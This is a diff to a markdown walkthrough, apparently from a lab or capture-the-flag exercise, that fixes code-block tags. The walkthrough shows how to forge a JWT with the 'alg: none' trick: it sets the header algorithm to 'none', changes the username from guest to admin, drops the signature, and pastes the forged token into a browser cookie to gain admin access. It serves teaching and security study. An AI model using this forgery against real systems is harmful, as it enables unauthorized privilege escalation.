@@ -29,7 +29,7 @@ This vulnerability allowed attackers to modify payload data without generating a
 
 *e.g.* We are logged in as "guest" with JWT token 
 
-<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzMxMTYzOTY5fQ.dHStDJLdo5WdnHADG75isaLTuHGuDn05q3S4HuuJQIg<code><pre>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzMxMTYzOTY5fQ.dHStDJLdo5WdnHADG75isaLTuHGuDn05q3S4HuuJQIg</code></pre>
 
 We want to log in as admin.
 
@@ -38,14 +38,14 @@ We want to log in as admin.
 **Step 2:** Convert the first part to plaintext, change the alg field to "none" and reconvert it back to base64.
 
 Now we have 
-<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=<code><pre>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=</code></pre>
 as the first part of our string.
 
 **Step 3:** Convert the second part to plaintext and change the value of the username field to be "admin".
 
 Convert it back to base64 and get 
  
-<pre><code>eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzMxMTYzNTc1fQ==<code><pre>
+<pre><code>eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzMxMTYzNTc1fQ==</code></pre>
 
 as the second part of our string.
 
@@ -53,7 +53,7 @@ as the second part of our string.
 
 **N.B. We don't have a signiature but we need the '.' at the end to signify empty signiature.** Our final evil JWT token is the following:
 
-<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzMxMTYzNTc1fQ==. <code><pre>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzMxMTYzNTc1fQ==. </code></pre>
 
 Entering this token into firefox (Developer Tools), --> Storage --> Cookies --> hostname --> jwt-session gives us admin access.
 
